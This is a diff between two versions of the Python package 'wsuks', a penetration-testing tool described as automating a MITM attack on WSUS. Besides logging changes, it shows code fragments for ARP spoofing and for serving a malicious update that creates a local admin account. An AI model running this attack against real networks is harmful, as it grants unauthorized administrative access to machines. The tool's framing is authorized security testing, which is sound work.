# Comparing `tmp/wsuks-0.2.2.tar.gz` & `tmp/wsuks-0.3.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "wsuks-0.2.2.tar", max compression
+gzip compressed data, was "wsuks-0.3.0.tar", max compression
```

## Comparing `wsuks-0.2.2.tar` & `wsuks-0.3.0.tar`

### file list

```diff
@@ -1,23 +1,23 @@
--rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.2.2/LICENSE
--rw-r--r--   0        0        0     2151 2023-07-04 20:57:09.903154 wsuks-0.2.2/README.md
--rw-r--r--   0        0        0      507 2023-07-07 11:21:47.601548 wsuks-0.2.2/pyproject.toml
--rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.2.2/wsuks/__init__.py
--rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.2.2/wsuks/executables/PsExec.exe
--rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.2.2/wsuks/executables/PsExec64.exe
--rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.2.2/wsuks/helpers/__init__.py
--rw-r--r--   0        0        0     3283 2023-07-07 11:20:23.173546 wsuks-0.2.2/wsuks/helpers/argparser.py
--rw-r--r--   0        0        0     3299 2023-07-02 21:55:54.610702 wsuks-0.2.2/wsuks/helpers/arpspoofer.py
--rw-r--r--   0        0        0     1697 2023-04-02 21:07:58.692346 wsuks-0.2.2/wsuks/helpers/logger.py
--rw-r--r--   0        0        0     3354 2023-07-01 16:23:15.421551 wsuks-0.2.2/wsuks/helpers/sysvolparser.py
--rw-r--r--   0        0        0    10326 2023-07-03 00:53:29.390923 wsuks-0.2.2/wsuks/helpers/wsusserver.py
--rw-r--r--   0        0        0     3285 2023-07-07 11:21:39.089548 wsuks-0.2.2/wsuks/wsuks.py
--rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.2.2/wsuks/xml_files/get-authorization-cookie.xml
--rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.2.2/wsuks/xml_files/get-config.xml
--rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.2.2/wsuks/xml_files/get-cookie.xml
--rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.2.2/wsuks/xml_files/get-extended-update-info.xml
--rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.2.2/wsuks/xml_files/internal-error.xml
--rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.2.2/wsuks/xml_files/register-computer.xml
--rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.2.2/wsuks/xml_files/report-event-batch.xml
--rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.2.2/wsuks/xml_files/sync-updates.xml
--rw-r--r--   0        0        0     3092 1970-01-01 00:00:00.000000 wsuks-0.2.2/setup.py
--rw-r--r--   0        0        0     2770 1970-01-01 00:00:00.000000 wsuks-0.2.2/PKG-INFO
+-rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.3.0/LICENSE
+-rw-r--r--   0        0        0     2151 2023-07-04 20:57:09.903154 wsuks-0.3.0/README.md
+-rw-r--r--   0        0        0      507 2023-07-07 23:35:53.932318 wsuks-0.3.0/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.3.0/wsuks/__init__.py
+-rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.3.0/wsuks/executables/PsExec.exe
+-rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.3.0/wsuks/executables/PsExec64.exe
+-rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.3.0/wsuks/helpers/__init__.py
+-rw-r--r--   0        0        0     3283 2023-07-07 11:20:23.173546 wsuks-0.3.0/wsuks/helpers/argparser.py
+-rw-r--r--   0        0        0     3306 2023-07-07 23:08:04.680283 wsuks-0.3.0/wsuks/helpers/arpspoofer.py
+-rw-r--r--   0        0        0     2628 2023-07-07 23:26:14.448306 wsuks-0.3.0/wsuks/helpers/logger.py
+-rw-r--r--   0        0        0     3361 2023-07-07 23:08:04.680283 wsuks-0.3.0/wsuks/helpers/sysvolparser.py
+-rw-r--r--   0        0        0    10323 2023-07-07 23:20:30.360298 wsuks-0.3.0/wsuks/helpers/wsusserver.py
+-rw-r--r--   0        0        0     3603 2023-07-07 23:34:44.580316 wsuks-0.3.0/wsuks/wsuks.py
+-rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.3.0/wsuks/xml_files/get-authorization-cookie.xml
+-rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.3.0/wsuks/xml_files/get-config.xml
+-rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.3.0/wsuks/xml_files/get-cookie.xml
+-rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.3.0/wsuks/xml_files/get-extended-update-info.xml
+-rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.3.0/wsuks/xml_files/internal-error.xml
+-rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.3.0/wsuks/xml_files/register-computer.xml
+-rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.3.0/wsuks/xml_files/report-event-batch.xml
+-rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.3.0/wsuks/xml_files/sync-updates.xml
+-rw-r--r--   0        0        0     3092 1970-01-01 00:00:00.000000 wsuks-0.3.0/setup.py
+-rw-r--r--   0        0        0     2770 1970-01-01 00:00:00.000000 wsuks-0.3.0/PKG-INFO
```

### Comparing `wsuks-0.2.2/LICENSE` & `wsuks-0.3.0/LICENSE`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/README.md` & `wsuks-0.3.0/README.md`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/executables/PsExec.exe` & `wsuks-0.3.0/wsuks/executables/PsExec.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/executables/PsExec64.exe` & `wsuks-0.3.0/wsuks/executables/PsExec64.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/helpers/argparser.py` & `wsuks-0.3.0/wsuks/helpers/argparser.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/helpers/arpspoofer.py` & `wsuks-0.3.0/wsuks/helpers/arpspoofer.py`

 * *Files 2% similar despite different names*

```diff
@@ -11,15 +11,15 @@
 
 class ArpSpoofer:
     """
     This class is used to enable MITM attacks with ARP spoofing.
     """
 
     def __init__(self):
-        self.logger = logging.getLogger()
+        self.logger = logging.getLogger("wsuks")
         self.isRunning = False
         self.targetIp = None
         self.spoofIp = None
 
     def _spoof(self, targetIp, spoofIp):
         """
         Spoof the target's ARP table by sending a fake ARP response with our MAC address as the sender.
```

### Comparing `wsuks-0.2.2/wsuks/helpers/logger.py` & `wsuks-0.3.0/wsuks/helpers/logger.py`

 * *Files 24% similar despite different names*

```diff
@@ -3,53 +3,84 @@
 
 import logging
 import sys
 from termcolor import colored
 
 
 class WsuksFormatter(logging.Formatter):
-    '''
+    """
     Prefixing logged messages through the custom attribute 'bullet'.
-    '''
+    """
 
     def __init__(self):
         logging.Formatter.__init__(self, '%(bullet)s %(message)s', None)
 
     def format(self, record):
         if record.levelno == logging.DEBUG:
             record.bullet = colored("DEBUG", "magenta", attrs=['bold'])
         elif record.levelno == logging.INFO:
             record.bullet = colored("[*]", "blue", attrs=['bold'])
+        elif record.levelno == logging.SUCCESS:
+            record.bullet = colored("[+]", "green", attrs=['bold'])
         elif record.levelno == logging.WARNING:
             record.bullet = colored("[!]", "yellow", attrs=['bold'])
         elif record.levelno == logging.ERROR:
             record.bullet = colored("[-]", "red", attrs=['bold'])
         elif record.levelno:
             record.bullet = '[ERROR]'
 
         return logging.Formatter.format(self, record)
 
 
 class WsuksFormatterTimeStamp(WsuksFormatter):
-    '''
+    """
     Prefixing logged messages through the custom attribute 'bullet'.
-    '''
+    """
 
     def __init__(self):
         logging.Formatter.__init__(self, '[%(asctime)-15s] %(bullet)s %(message)s', None)
 
     def formatTime(self, record):
         return WsuksFormatter.formatTime(self, record, datefmt="%Y-%m-%d %H:%M:%S")
+    
+def addSuccessLogLevel(logger):
+    logging.SUCCESS = 25  # between WARNING and INFO
+    logging.addLevelName(logging.SUCCESS, 'SUCCESS')
+    
+    def success(self, msg, *args, **kwargs):
+        logger._log(25, msg, args, **kwargs)
+    setattr(logging.getLoggerClass(), 'success', success)
+    
 
 
 def initLogger(ts=False, debug=False):
+    """
+    Initialize wsuks logger with specified logging level, add formatter, handler and success log level
+
+    :param ts: Add timestamp to log messages
+    :param debug: Set logging level to DEBUG
+    :return: logger
+    """
     handler = logging.StreamHandler(sys.stdout)
     if ts:
         handler.setFormatter(WsuksFormatterTimeStamp())
     else:
         handler.setFormatter(WsuksFormatter())
-    logging.getLogger().addHandler(handler)
     
+    logger = logging.getLogger("wsuks")
+    logger.propagate = False
+    root_logger = logging.getLogger()
+
+    logger.addHandler(handler)
+    root_logger.addHandler(handler)
+
     if debug:
-        logging.getLogger().setLevel(logging.DEBUG)
+        logger.setLevel(logging.DEBUG)
+        root_logger.setLevel(logging.DEBUG)
     else:
-        logging.getLogger().setLevel(logging.INFO)
+        logger.setLevel(logging.INFO)
+        root_logger.setLevel(logging.INFO)
+
+    addSuccessLogLevel(logger)
+    addSuccessLogLevel(root_logger)
+    
+    return logger
```

### Comparing `wsuks-0.2.2/wsuks/helpers/sysvolparser.py` & `wsuks-0.3.0/wsuks/helpers/sysvolparser.py`

 * *Files 1% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 import sys
 import traceback
 from impacket.smbconnection import SMBConnection
 
 
 class SysvolParser():
     def __init__(self):
-        self.logger = logging.getLogger()
+        self.logger = logging.getLogger("wsuks")
         self.smbClient = None
         self.share = "SYSVOL"
         self.wsusIp = None
         self.wsusPort = None  # Default 8530
 
     def _createSMBConnection(self, domain, username, password, dcIp, kerberos=False, lmhash='', nthash='', aesKey=''):
         """
```

### Comparing `wsuks-0.2.2/wsuks/helpers/wsusserver.py` & `wsuks-0.3.0/wsuks/helpers/wsusserver.py`

 * *Files 2% similar despite different names*

```diff
@@ -12,16 +12,16 @@
 import hashlib
 import sys
 import os
 import wsuks
 
 
 class WSUSUpdateHandler:
-    def __init__(self, executable_file, executable_name, client_address, logger):
-        self.logger = logger
+    def __init__(self, executable_file, executable_name, client_address):
+        self.logger = logging.getLogger("wsuks")
 
         self.get_config_xml = ''
         self.get_cookie_xml = ''
         self.register_computer_xml = ''
         self.sync_updates_xml = ''
         self.get_extended_update_info_xml = ''
         self.report_event_batch_xml = ''
@@ -123,18 +123,17 @@
             sys.exit(1)
 
     def __str__(self):
         return f'The update metadata - uuids: {self.uuids}, revision_ids: {self.revision_ids}, deployment_ids: {self.deployment_ids}, executable: {self.executable_name}, sha1: {self.sha1}, sha256: {self.sha256}, command: {self.command}'
 
 
 class WSUSBaseServer(BaseHTTPRequestHandler):
-    def __init__(self, logger, wsusUpdateHandler):
-        self.logger = logger
+    def __init__(self, wsusUpdateHandler):
+        self.logger = logging.getLogger("wsuks")
         self.wsusUpdateHandler = wsusUpdateHandler
-        super().__init__()
 
     def _set_response(self, serveEXE=False):
 
         self.protocol_version = 'HTTP/1.1'
         self.send_response(200)
         # self.server_version = 'Microsoft-IIS/10.0'
         # self.send_header('Accept-Ranges', 'bytes')
```

### Comparing `wsuks-0.2.2/wsuks/wsuks.py` & `wsuks-0.3.0/wsuks/wsuks.py`

 * *Files 27% similar despite different names*

```diff
@@ -8,60 +8,63 @@
 import random
 from string import digits, ascii_letters
 from scapy.all import get_if_addr, sniff
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
 from wsuks.helpers.sysvolparser import SysvolParser
-from wsuks.helpers.wsusserver import WSUSUpdateHandler
+from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+from termcolor import colored
 
 
 class Wsuks:
     def __init__(self, args):
-        self.logger = logging.getLogger()
+        self.logger = logging.getLogger("wsuks")
         self.hostIp = get_if_addr(args.interface)
-        self.username = "user" + "".join(random.choice(digits) for i in range(5))
-        self.password = "".join(random.sample(ascii_letters, 16))
+        self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
+        self.local_password = "".join(random.sample(ascii_letters, 16))
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
-        self.command = args.command.replace("WSUKS_USER", self.username).replace("WSUKS_PASSWORD", self.password)
+        self.command = args.command.replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
 
         self.wsusIp = args.wsusIp
         self.wsusPort = args.wsusPort  # Default 8530
-        self.username = args.username
-        self.password = args.password
+        self.domain_username = args.username
+        self.domain_password = args.password
         self.domain = args.domain
         self.dcIp = args.dcIp
 
     def run(self):
         # Get the WSUS server IP and Port from the sysvol share
         sysvolparser = SysvolParser()
         if not self.wsusIp:
             self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
-            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
+            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp)
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
         arpspoofer.start(self.targetIp, self.wsusIp)
 
         # Prepare WSUS Update Handler
         # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
-        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
+        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
 
         # Prepare WSUS HTTP Server
-        http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
+        wsusBaseServer = WSUSBaseServer(update_handler)
+        http_server = HTTPServer((self.hostIp, self.wsusPort), wsusBaseServer)
+        self.logger.success(f"Generated Credentials for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
         try:
             self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
             http_server.serve_forever()
         except KeyboardInterrupt:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
@@ -72,18 +75,17 @@
 
 
 def main():
     # Setup
     printBanner()
     args = initParser()
 
-    initLogger(debug=args.debug)
-    logger = logging.getLogger('wsuks')
+    logger = initLogger(debug=args.debug)
     logger.debug('Passed args:\n' + pformat(vars(args)))
-    
+
     # Prevent scapy from logging to console
     scapyLogger = logging.getLogger('scapy')
     scapyLogger.handlers.clear()
 
     if os.geteuid() != 0:
         logger.error("This script must be run as root!")
         exit(1)
```

### Comparing `wsuks-0.2.2/wsuks/xml_files/get-authorization-cookie.xml` & `wsuks-0.3.0/wsuks/xml_files/get-authorization-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/xml_files/get-config.xml` & `wsuks-0.3.0/wsuks/xml_files/get-config.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/xml_files/get-cookie.xml` & `wsuks-0.3.0/wsuks/xml_files/get-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/xml_files/get-extended-update-info.xml` & `wsuks-0.3.0/wsuks/xml_files/get-extended-update-info.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/wsuks/xml_files/sync-updates.xml` & `wsuks-0.3.0/wsuks/xml_files/sync-updates.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.2.2/setup.py` & `wsuks-0.3.0/setup.py`

 * *Files 5% similar despite different names*

```diff
@@ -14,15 +14,15 @@
  'termcolor>=2.2.0,<3.0.0']
 
 entry_points = \
 {'console_scripts': ['wsuks = wsuks.wsuks:main']}
 
 setup_kwargs = {
     'name': 'wsuks',
-    'version': '0.2.2',
+    'version': '0.3.0',
     'description': 'A Tool for automating the MITM attack on the WSUS connection',
     'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nGaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.\nBy default, a Windows client requests updates every 24 hours. \n\nBoth the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.\n\nPrerequisits:\n- The target Client must be on the local network\n- The Windows Server Update Service (WSUS) must be configured using HTTP\n\nResult:\n- After successful execution a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created and added to the local admin group\n\n## Installation\nUsing pipx:\n```\nsudo apt install python3-pipx\npipx ensurepath\npipx install wsuks\nsudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nWith pipx:\n```\nsudo wsuks\nsuso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\nWith poetry:\n```\nsudo poetry run wsuks\nsudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
     'author': 'Alexander Neff',
     'author_email': 'alex99.neff@gmx.de',
     'maintainer': 'None',
     'maintainer_email': 'None',
     'url': 'None',
```

### Comparing `wsuks-0.2.2/PKG-INFO` & `wsuks-0.3.0/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: wsuks
-Version: 0.2.2
+Version: 0.3.0
 Summary: A Tool for automating the MITM attack on the WSUS connection
 License: MIT
 Author: Alexander Neff
 Author-email: alex99.neff@gmx.de
 Requires-Python: >=3.10,<4.0
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
```

